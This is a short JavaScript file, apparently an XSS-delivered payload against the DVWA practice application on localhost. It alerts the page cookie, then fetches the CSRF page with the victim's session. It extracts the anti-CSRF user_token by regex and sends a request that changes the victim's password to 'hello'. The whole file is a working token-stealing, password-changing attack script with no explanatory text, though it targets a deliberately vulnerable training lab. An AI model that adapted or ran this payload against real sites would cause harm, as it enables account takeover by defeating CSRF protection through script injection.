alert(document.cookie);

var theUrl = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/';
if(window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
}else{
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}
var count = 0;
xmlhttp.withCredentials = true;
xmlhttp.onreadystatechange=function(){
    if(xmlhttp.readyState ==4 && xmlhttp.status==200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        console.log(match);
        alert(match[1]);
            var token = match[1];
                var new_url = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new=hello&password_conf=hello&Change=Change';
                if(count==0){
                    count++;
                    xmlhttp.open("GET",new_url,false);
                    xmlhttp.send();
                }
    }
};
xmlhttp.open("GET",theUrl,false);
xmlhttp.send();
